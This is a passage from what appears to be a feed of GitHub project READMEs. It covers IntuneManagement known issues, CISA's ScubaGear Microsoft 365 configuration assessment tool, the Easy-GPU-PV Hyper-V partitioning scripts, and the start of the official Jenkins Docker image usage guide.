&lt;p&gt;Android Store Apps are &lt;strong&gt;not&lt;/strong&gt; imported. The Create API is documented in Microsoft Graph but it&#39;s not working. Looks like these apps must be synched from Google Play.&lt;/p&gt; 
&lt;p&gt;Using multiple tenants support causes multiple logins/consent prompts the first time if &#39;Microsoft Graph PowerShell&#39; is used. Querying the API for tenant list uses a different scope that is not included by default in the &#39;Microsoft Graph PowerShell&#39; app.&lt;/p&gt; 
&lt;p&gt;&lt;del&gt;Using multiple tenants support &lt;em&gt;might&lt;/em&gt; cause and endless loop in the login screen and cause duplicate accounts in token cache. Actual cause is not found yet but it happens on rare occasions and it looks like it happens when a guest account is used. Workaround: Cancel the login, restart the script, logout and restart the script again.&lt;/del&gt; - Not seen this in a long time. Please create an issue if this happens&lt;/p&gt; 
&lt;p&gt;When multi tenant settings is Enabled/Disabled, the Profile Info is not updated until the account is changed or app is restarted. Profile Info popup is built after logon.&lt;/p&gt; 
&lt;p&gt;The &lt;em&gt;List Applications&lt;/em&gt; API might not list an imported app immediately after the import. Click &lt;em&gt;Refresh&lt;/em&gt; to reload the application objects.&lt;/p&gt; 
&lt;p&gt;&lt;del&gt;When using the filter box to search for items, the checkbox must be clicked twice to select an item.&lt;/del&gt;&lt;br /&gt; Issue fixed in 3.3.2&lt;/p&gt; 
&lt;p&gt;Logout will only clear the token from cache and not from the browser e.g. if login is triggered after a logout, the user will still be listed in the &#39;Select user&#39; dialog.&lt;/p&gt; 
&lt;p&gt;&lt;del&gt;Referenced settings will NOT be imported/copied. There is no value stored in a property on the object for these settings. Example: A VPN profile has certificates as referenced properties. The certificates must be added manually after import/copy.&lt;/del&gt; Issue fixed in 3.5.0&lt;/p&gt; 
&lt;p&gt;Terms of Use requires that the pdf file is available. This must be manually copied to either the Export folder for Terms of Use or to the Intune Application folder specified in Settings. It is currently not possible to export the pdf file with Graph API.&lt;/p&gt; 
&lt;p&gt;The ADMX/ADML files must be manually copied to either the Export folder for Administrative Templates or to the Intune Application folder specified in Settings. It is currently not possible to export the pdf file with Graph API.&lt;/p&gt; 
&lt;p&gt;See &lt;a href=&quot;https://raw.githubusercontent.com/Micke-K/IntuneManagement/master/Documentation.md&quot;&gt;Documentation&lt;/a&gt; for issues regarding the documentation process.&lt;/p&gt; 
&lt;h2&gt;TIP&lt;/h2&gt; 
&lt;p&gt;Check the log file for errors. The UI might not show errors why login failed etc. The log uses the Endpoint Configuration Manager (SCCM) format and it is best viewed with CMTrace or OneTrace. An old version of CMTrace can be downloaded &lt;a href=&quot;https://www.microsoft.com/en-us/download/confirmation.aspx?id=50012&quot;&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;This project is licensed under the MIT License - see the &lt;a href=&quot;https://raw.githubusercontent.com/Micke-K/IntuneManagement/master/LICENSE&quot;&gt;LICENSE&lt;/a&gt; file for details.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>cisagov/ScubaGear</title>
      <link>https://github.com/cisagov/ScubaGear</link>
      <description>&lt;p&gt;Automation to assess the state of your M365 tenant against CISA&#39;s baselines&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/images/SCuBA%20GitHub%20Graphic%20v6-05.png&quot; alt=&quot;ScubaGear Logo&quot; /&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/cisagov/ScubaGear/releases&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/v/release/cisagov/ScubaGear?label=GitHub&amp;amp;logo=github&quot; alt=&quot;GitHub Release&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://www.powershellgallery.com/packages/ScubaGear&quot;&gt;&lt;img src=&quot;https://img.shields.io/powershellgallery/v/ScubaGear?logo=powershell&amp;amp;label=PSGallery&quot; alt=&quot;PSGallery Release&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/cisagov/ScubaGear/actions/workflows/run_pipeline.yaml&quot;&gt;&lt;img src=&quot;https://github.com/cisagov/ScubaGear/actions/workflows/run_pipeline.yaml/badge.svg?sanitize=true&quot; alt=&quot;CI Pipeline&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/cisagov/ScubaGear/actions/workflows/test_production_function.yaml&quot;&gt;&lt;img src=&quot;https://github.com/cisagov/ScubaGear/actions/workflows/test_production_function.yaml/badge.svg?sanitize=true&quot; alt=&quot;Functional Tests&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/cisagov/ScubaGear/raw/main/LICENSE&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/license/cisagov/ScubaGear&quot; alt=&quot;GitHub License&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/cisagov/ScubaGear/releases&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/downloads/cisagov/ScubaGear/total?logo=github&quot; alt=&quot;GitHub Downloads&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://www.powershellgallery.com/packages/ScubaGear&quot;&gt;&lt;img src=&quot;https://img.shields.io/powershellgallery/dt/ScubaGear?logo=powershell&quot; alt=&quot;PSGallery Downloads&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/cisagov/ScubaGear/issues&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/issues/cisagov/ScubaGear&quot; alt=&quot;GitHub Issues&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;ScubaGear is an assessment tool that verifies that a Microsoft 365 (M365) tenant’s configuration conforms to the policies described in the Secure Cloud Business Applications (&lt;a href=&quot;https://cisa.gov/scuba&quot;&gt;SCuBA&lt;/a&gt;) Secure Configuration Baseline &lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/baselines/README.md&quot;&gt;documents&lt;/a&gt;.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: This documentation can be read using &lt;a href=&quot;https://cisagov.github.io/ScubaGear&quot;&gt;GitHub Pages&lt;/a&gt;.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;Target Audience&lt;/h2&gt; 
&lt;p&gt;ScubaGear is for M365 administrators who want to assess their tenant environments against CISA Secure Configuration Baselines.&lt;/p&gt; 
&lt;h2&gt;Overview&lt;/h2&gt; 
&lt;p&gt;ScubaGear uses a three-step process:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Step One&lt;/strong&gt; - PowerShell code queries M365 APIs for various configuration settings.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Step Two&lt;/strong&gt; - It then calls &lt;a href=&quot;https://www.openpolicyagent.org&quot;&gt;Open Policy Agent&lt;/a&gt; (OPA) to compare these settings against Rego security policies written per the baseline documents.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Step Three&lt;/strong&gt; - Finally, it reports the results of the comparison as HTML, JSON, and CSV.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;img src=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/images/scuba-process.png&quot; /&gt; 
&lt;h2&gt;Getting Started&lt;/h2&gt; 
&lt;p&gt;To install ScubaGear from &lt;a href=&quot;https://www.powershellgallery.com/packages/ScubaGear&quot;&gt;PSGallery&lt;/a&gt;, open a PowerShell 5 terminal on a Windows computer and install the module:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;# Install ScubaGear
Install-Module -Name ScubaGear
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;To install its dependencies:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;# Install the minimum required dependencies
Initialize-SCuBA 
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;To verify that it is installed:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;# Check the version
Invoke-SCuBA -Version
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;To run ScubaGear:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;# Assess all products
Invoke-SCuBA -ProductNames *
&lt;/code&gt;&lt;/pre&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Successfully running ScubaGear requires certain prerequisites and configuration settings. To learn more, read through the sections below.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;Table of Contents&lt;/h2&gt; 
&lt;p&gt;The following sections should be read in order.&lt;/p&gt; 
&lt;h3&gt;Installation&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/installation/psgallery.md&quot;&gt;Install from PSGallery&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/installation/github.md&quot;&gt;Download from GitHub&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/installation/uninstall.md&quot;&gt;Uninstall&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Prerequisites&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/prerequisites/dependencies.md&quot;&gt;Dependencies&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/prerequisites/permissions.md&quot;&gt;Required Permissions&lt;/a&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/prerequisites/interactive.md&quot;&gt;Interactive Permissions&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/prerequisites/noninteractive.md&quot;&gt;Non-Interactive Permissions&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Execution&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/execution/execution.md&quot;&gt;Execution&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/execution/reports.md&quot;&gt;Reports&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Configuration&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/configuration/parameters.md&quot;&gt;Parameters&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/configuration/configuration.md&quot;&gt;Configuration File&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Troubleshooting&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/troubleshooting/tenants.md&quot;&gt;Multiple Tenants&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/troubleshooting/defender.md&quot;&gt;Defender&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/troubleshooting/exchange.md&quot;&gt;Exchange Online&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/troubleshooting/power.md&quot;&gt;Power Platform&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/troubleshooting/graph.md&quot;&gt;Microsoft Graph&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/troubleshooting/proxy.md&quot;&gt;Proxy&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Misc&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/misc/assumptions.md&quot;&gt;Assumptions&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/cisagov/ScubaGear/main/docs/misc/mappings.md&quot;&gt;Mappings&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Project License&lt;/h2&gt; 
&lt;p&gt;Unless otherwise noted, this project is distributed under the Creative Commons Zero license. With developer approval, contributions may be submitted with an alternate compatible license. If accepted, those contributions will be listed herein with the appropriate license.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>jamesstringerparsec/Easy-GPU-PV</title>
      <link>https://github.com/jamesstringerparsec/Easy-GPU-PV</link>
      <description>&lt;p&gt;A Project dedicated to making GPU Partitioning on Windows easier!&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Easy-GPU-PV&lt;/h1&gt; 
&lt;p&gt;A work-in-progress project dedicated to making GPU Paravirtualization on Windows Hyper-V easier!&lt;/p&gt; 
&lt;p&gt;GPU-PV allows you to partition your systems dedicated or integrated GPU and assign it to several Hyper-V VMs. It&#39;s the same technology that is used in WSL2, and Windows Sandbox.&lt;/p&gt; 
&lt;p&gt;Easy-GPU-PV aims to make this easier by automating the steps required to get a GPU-PV VM up and running.&lt;br /&gt; Easy-GPU-PV does the following...&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Creates a VM of your choosing&lt;/li&gt; 
 &lt;li&gt;Automatically Installs Windows to the VM&lt;/li&gt; 
 &lt;li&gt;Partitions your GPU of choice and copies the required driver files to the VM&lt;/li&gt; 
 &lt;li&gt;Installs &lt;a href=&quot;https://parsec.app&quot;&gt;Parsec&lt;/a&gt; to the VM, Parsec is an ultra low latency remote desktop app, use this to connect to the VM. You can use Parsec for free non commercially. To use Parsec commercially, sign up to a &lt;a href=&quot;https://parsec.app/teams&quot;&gt;Parsec For Teams&lt;/a&gt; account&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Prerequisites:&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Windows 10 20H1+ Pro, Enterprise or Education OR Windows 11 Pro, Enterprise or Education. Windows 11 on host and VM is preferred due to better compatibility.&lt;/li&gt; 
 &lt;li&gt;Matched Windows versions between the host and VM. Mismatches may cause compatibility issues, blue-screens, or other issues. (Win10 21H1 + Win10 21H1, or Win11 21H2 + Win11 21H2, for example)&lt;/li&gt; 
 &lt;li&gt;Desktop Computer with dedicated NVIDIA/AMD GPU or Integrated Intel GPU - Laptops with NVIDIA GPUs are not supported at this time, but Intel integrated GPUs work on laptops. GPU must support hardware video encoding (NVIDIA NVENC, Intel Quicksync or AMD AMF).&lt;/li&gt; 
 &lt;li&gt;Latest GPU driver from Intel.com or NVIDIA.com, don&#39;t rely on Device manager or Windows update.&lt;/li&gt; 
 &lt;li&gt;Latest Windows 10 ISO &lt;a href=&quot;https://www.microsoft.com/en-gb/software-download/windows10ISO&quot;&gt;downloaded from here&lt;/a&gt; / Windows 11 ISO &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows11&quot;&gt;downloaded from here.&lt;/a&gt; - Do not use Media Creation Tool, if no direct ISO link is available, follow &lt;a href=&quot;https://www.nextofwindows.com/downloading-windows-10-iso-images-using-rufus&quot;&gt;this guide.&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Virtualisation enabled in the motherboard and &lt;a href=&quot;https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v&quot;&gt;Hyper-V fully enabled&lt;/a&gt; on the Windows 10/ 11 OS (requires reboot).&lt;/li&gt; 
 &lt;li&gt;Allow Powershell scripts to run on your system - typically by running &quot;Set-ExecutionPolicy unrestricted&quot; in Powershell running as Administrator.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Instructions&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;Make sure your system meets the prerequisites.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/jamesstringerparsec/Easy-GPU-PV/archive/refs/heads/main.zip&quot;&gt;Download the Repo and extract.&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Search your system for Powershell ISE and run as Administrator.&lt;/li&gt; 
 &lt;li&gt;In the extracted folder you downloaded, open PreChecks.ps1 in Powershell ISE. Run the files from within the extracted folder. Do not move them.&lt;/li&gt; 
 &lt;li&gt;Open and Run PreChecks.ps1 in Powershell ISE using the green play button and copy the GPU Listed (or the warnings that you need to fix).&lt;/li&gt; 
 &lt;li&gt;Open CopyFilesToVM.ps1 Powershell ISE and edit the params section at the top of the file, you need to be careful about how much ram, storage and hard drive you give it as your system needs to have that available. On Windows 10 the GPUName must be left as &quot;AUTO&quot;, In Windows 11 it can be either &quot;AUTO&quot; or the specific name of the GPU you want to partition exactly how it appears in PreChecks.ps1. Additionally, you need to provide the path to the Windows 10/11 ISO file you downloaded.&lt;/li&gt; 
 &lt;li&gt;Run CopyFilesToVM.ps1 with your changes to the params section - this may take 5-10 minutes.&lt;/li&gt; 
 &lt;li&gt;Open and sign into Parsec on the VM. You can use Parsec to connect to the VM up to 4K60FPS.&lt;/li&gt; 
 &lt;li&gt;You should be good to go!&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Upgrading GPU Drivers when you update the host GPU Drivers&lt;/h3&gt; 
&lt;p&gt;It&#39;s important to update the VM GPU Drivers after you have updated the Host GPUs drivers. You can do this by...&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Reboot the host after updating GPU Drivers.&lt;/li&gt; 
 &lt;li&gt;Open Powershell as administrator and change directory (CD) to the path that CopyFilesToVM.ps1 and Update-VMGpuPartitionDriver.ps1 are located.&lt;/li&gt; 
 &lt;li&gt;Run &lt;code&gt;Update-VMGpuPartitionDriver.ps1 -VMName &quot;Name of your VM&quot; -GPUName &quot;Name of your GPU&quot;&lt;/code&gt; (Windows 10 GPU name must be &quot;AUTO&quot;)&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Values&lt;/h3&gt; 
&lt;p&gt;&lt;code&gt;VMName = &quot;GPUP&quot;&lt;/code&gt; - Name of VM in Hyper-V and the computername / hostname&lt;br /&gt; &lt;code&gt;SourcePath = &quot;C:\Users\james\Downloads\Win11_English_x64.iso&quot;&lt;/code&gt; - path to Windows 10/ 11 ISO on your host&lt;br /&gt; &lt;code&gt;Edition = 6&lt;/code&gt; - Leave as 6, this means Windows 10/11 Pro&lt;br /&gt; &lt;code&gt;VhdFormat = &quot;VHDX&quot;&lt;/code&gt; - Leave this value alone&lt;br /&gt; &lt;code&gt;DiskLayout = &quot;UEFI&quot;&lt;/code&gt; - Leave this value alone&lt;br /&gt; &lt;code&gt;SizeBytes = 40gb&lt;/code&gt; - Disk size, in this case 40GB, the minimum is 20GB&lt;br /&gt; &lt;code&gt;MemoryAmount = 8GB&lt;/code&gt; - Memory size, in this case 8GB&lt;br /&gt; &lt;code&gt;CPUCores = 4&lt;/code&gt; - CPU Cores you want to give VM, in this case 4&lt;br /&gt; &lt;code&gt;NetworkSwitch = &quot;Default Switch&quot;&lt;/code&gt; - Leave this alone unless you&#39;re not using the default Hyper-V Switch&lt;br /&gt; &lt;code&gt;VHDPath = &quot;C:\Users\Public\Documents\Hyper-V\Virtual Hard Disks\&quot;&lt;/code&gt; - Path to the folder you want the VM Disk to be stored in, it must already exist&lt;br /&gt; &lt;code&gt;UnattendPath = &quot;$PSScriptRoot&quot;+&quot;\autounattend.xml&quot;&lt;/code&gt; -Leave this value alone&lt;br /&gt; &lt;code&gt;GPUName = &quot;AUTO&quot;&lt;/code&gt; - AUTO selects the first available GPU. On Windows 11 you may also use the exact name of the GPU you want to share with the VM in multi GPU situations (GPU selection is not available in Windows 10 and must be set to AUTO)&lt;br /&gt; &lt;code&gt;GPUResourceAllocationPercentage = 50&lt;/code&gt; - Percentage of the GPU you want to share with the VM&lt;br /&gt; &lt;code&gt;Team_ID = &quot;&quot;&lt;/code&gt; - The Parsec for Teams ID if you are a Parsec for Teams Subscriber&lt;br /&gt; &lt;code&gt;Key = &quot;&quot;&lt;/code&gt; - The Parsec for Teams Secret Key if you are a Parsec for Teams Subscriber&lt;br /&gt; &lt;code&gt;Username = &quot;GPUVM&quot;&lt;/code&gt; - The VM Windows Username, do not include special characters, and must be different from the &quot;VMName&quot; value you set&lt;br /&gt; &lt;code&gt;Password = &quot;CoolestPassword!&quot;&lt;/code&gt; - The VM Windows Password, cannot be blank&lt;br /&gt; &lt;code&gt;Autologon = &quot;true&quot;&lt;/code&gt;- If you want the VM to automatically login to the Windows Desktop&lt;/p&gt; 
&lt;h3&gt;Thanks to:&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/tabs-not-spaces/Hyper-ConvertImage&quot;&gt;Hyper-ConvertImage&lt;/a&gt; for creating an updated version of &lt;a href=&quot;https://github.com/MicrosoftDocs/Virtualization-Documentation/tree/master/hyperv-tools/Convert-WindowsImage&quot;&gt;Convert-WindowsImage&lt;/a&gt; that is compatible with Windows 10 and 11.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/gawainXX&quot;&gt;gawainXX&lt;/a&gt; for help testing and pointing out bugs and feature improvements.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Notes:&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;After you have signed into Parsec on the VM, always use Parsec to connect to the VM. Keep the Microsft Hyper-V Video adapter disabled. Using RDP and Hyper-V Enhanced Session mode will result in broken behaviour and black screens in Parsec. RDP and the Hyper-V video adapter only offer a maximum of 30FPS. Using Parsec will allow you to use up to 4k60 FPS.&lt;/li&gt; 
 &lt;li&gt;If you get &quot;ERROR : Cannot bind argument to parameter &#39;Path&#39; because it is null.&quot; this probably means you used Media Creation Tool to download the ISO. You unfortunately cannot use that, if you don&#39;t see a direct ISO download link at the Microsoft page, follow &lt;a href=&quot;https://www.nextofwindows.com/downloading-windows-10-iso-images-using-rufus&quot;&gt;this guide.&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Your GPU on the host will have a Microsoft driver in device manager, rather than an nvidia/intel/amd driver. As long as it doesn&#39;t have a yellow triangle over top of the device in device manager, it&#39;s working correctly.&lt;/li&gt; 
 &lt;li&gt;A powered on display / HDMI dummy dongle must be plugged into the GPU to allow Parsec to capture the screen. You only need one of these per host machine regardless of number of VM&#39;s.&lt;/li&gt; 
 &lt;li&gt;If your computer is super fast it may get to the login screen before the audio driver (VB Cable) and Parsec display driver are installed, but fear not! They should soon install.&lt;/li&gt; 
 &lt;li&gt;The screen may go black for times up to 10 seconds in situations when UAC prompts appear, applications go in and out of fullscreen and when you switch between video codecs in Parsec - not really sure why this happens, it&#39;s unique to GPU-P machines and seems to recover faster at 1280x720.&lt;/li&gt; 
 &lt;li&gt;Vulkan renderer is unavailable and GL games may or may not work. &lt;a href=&quot;https://www.microsoft.com/en-us/p/opencl-and-opengl-compatibility-pack/9nqpsl29bfff?SilentAuth=1&amp;amp;wa=wsignin1.0#activetab=pivot:overviewtab&quot;&gt;This&lt;/a&gt; may help with some OpenGL apps.&lt;/li&gt; 
 &lt;li&gt;If you do not have administrator permissions on the machine it means you set the username and vmname to the same thing, these needs to be different.&lt;/li&gt; 
 &lt;li&gt;AMD Polaris GPUS like the RX 580 do not support hardware video encoding via GPU Paravirtualization at this time.&lt;/li&gt; 
 &lt;li&gt;To download Windows ISOs with Rufus, it must have &quot;Check for updates&quot; enabled.&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>jenkinsci/docker</title>
      <link>https://github.com/jenkinsci/docker</link>
      <description>&lt;p&gt;Docker official jenkins repo&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Official Jenkins Docker image&lt;/h1&gt; 
&lt;p&gt;&lt;a href=&quot;https://hub.docker.com/r/jenkins/jenkins/&quot;&gt;&lt;img src=&quot;https://img.shields.io/docker/stars/jenkins/jenkins.svg?sanitize=true&quot; alt=&quot;Docker Stars&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://hub.docker.com/r/jenkins/jenkins/&quot;&gt;&lt;img src=&quot;https://img.shields.io/docker/pulls/jenkins/jenkins.svg?sanitize=true&quot; alt=&quot;Docker Pulls&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://gitter.im/jenkinsci/docker?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=badge&quot;&gt;&lt;img src=&quot;https://badges.gitter.im/jenkinsci/docker.svg?sanitize=true&quot; alt=&quot;Join the chat at https://gitter.im/jenkinsci/docker&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;The Jenkins Continuous Integration and Delivery server &lt;a href=&quot;https://hub.docker.com/r/jenkins/jenkins&quot;&gt;available on Docker Hub&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;This is a fully functional Jenkins server. &lt;a href=&quot;https://jenkins.io/&quot;&gt;https://jenkins.io/&lt;/a&gt;.&lt;/p&gt; 
&lt;img src=&quot;https://jenkins.io/sites/default/files/jenkins_logo.png&quot; /&gt; 
&lt;h1&gt;Usage&lt;/h1&gt; 
&lt;pre&gt;&lt;code&gt;docker run -p 8080:8080 -p 50000:50000 --restart=on-failure jenkins/jenkins:lts-jdk17
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;NOTE: read the section &lt;a href=&quot;https://raw.githubusercontent.com/jenkinsci/docker/master/#connecting-agents&quot;&gt;&lt;em&gt;Connecting agents&lt;/em&gt;&lt;/a&gt; below for the role of the &lt;code&gt;50000&lt;/code&gt; port mapping. NOTE: read the section &lt;a href=&quot;https://raw.githubusercontent.com/jenkinsci/docker/master/#dns-configuration&quot;&gt;&lt;em&gt;DNS Configuration&lt;/em&gt;&lt;/a&gt; in case you see the message &quot;This Jenkins instance appears to be offline.&quot;&lt;/p&gt; 
&lt;p&gt;This will store the workspace in &lt;code&gt;/var/jenkins_home&lt;/code&gt;. All Jenkins data lives in there - including plugins and configuration. You will probably want to make that an explicit volume so you can manage it and attach to another container for upgrades :&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker run -p 8080:8080 -p 50000:50000 --restart=on-failure -v jenkins_home:/var/jenkins_home jenkins/jenkins:lts-jdk17
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This will automatically create a &#39;jenkins_home&#39; &lt;a href=&quot;https://docs.docker.com/storage/volumes/&quot;&gt;docker volume&lt;/a&gt; on the host machine. Docker volumes retain their content even when the container is stopped, started, or deleted.&lt;/p&gt; 
&lt;p&gt;NOTE: Avoid using a &lt;a href=&quot;https://docs.docker.com/storage/bind-mounts/&quot;&gt;bind mount&lt;/a&gt; from a folder on the host machine into &lt;code&gt;/var/jenkins_home&lt;/code&gt;, as this might result in file permission issues (the user used inside the container might not have rights to the folder on the host machine). If you &lt;em&gt;really&lt;/em&gt; need to bind mount jenkins_home, ensure that the directory on the host is accessible by the jenkins user inside the container (jenkins user - uid 1000) or use &lt;code&gt;-u some_other_user&lt;/code&gt; parameter with &lt;code&gt;docker run&lt;/code&gt;.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker run -d -v jenkins_home:/var/jenkins_home -p 8080:8080 -p 50000:50000 --restart=on-failure jenkins/jenkins:lts-jdk17
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This will run Jenkins in detached mode with port forwarding and volume added. You can access logs with command &#39;docker logs CONTAINER_ID&#39; in order to check first login token. ID of container will be returned from output of command above.&lt;/p&gt; 
&lt;p&gt;Or, directly print the initial admin password using:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker exec &amp;lt;jenkins_container_id_or_name&amp;gt; cat /var/jenkins_home/secrets/initialAdminPassword
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Replace &amp;lt;jenkins_container_id_or_name&amp;gt; with your actual Jenkins container id or name.&lt;/p&gt; 
&lt;h2&gt;Backing up data&lt;/h2&gt; 
&lt;p&gt;If you bind mount in a volume - you can simply back up that directory (which is jenkins_home) at any time.&lt;/p&gt; 
&lt;p&gt;Using a bind mount is not recommended since it can lead to permission issues. Treat the jenkins_home directory as you would a database - in Docker you would generally put a database on a volume.&lt;/p&gt; 
&lt;p&gt;If your volume is inside a container - you can use &lt;code&gt;docker cp $ID:/var/jenkins_home&lt;/code&gt; command to extract the data, or other options to find where the volume data is. Note that some symlinks on some OSes may be converted to copies (this can confuse jenkins with lastStableBuild links, etc)&lt;/p&gt; 
&lt;p&gt;For more info check Docker docs section on &lt;a href=&quot;https://docs.docker.com/storage/volumes/&quot;&gt;Use volumes&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Setting the number of executors&lt;/h2&gt; 
&lt;p&gt;You can define the number of executors on the Jenkins built-in node using a groovy script. By default it is set to 2 executors, but you can extend the image and change it to your desired number of executors (recommended 0 executors on the built-in node) :&lt;/p&gt; 
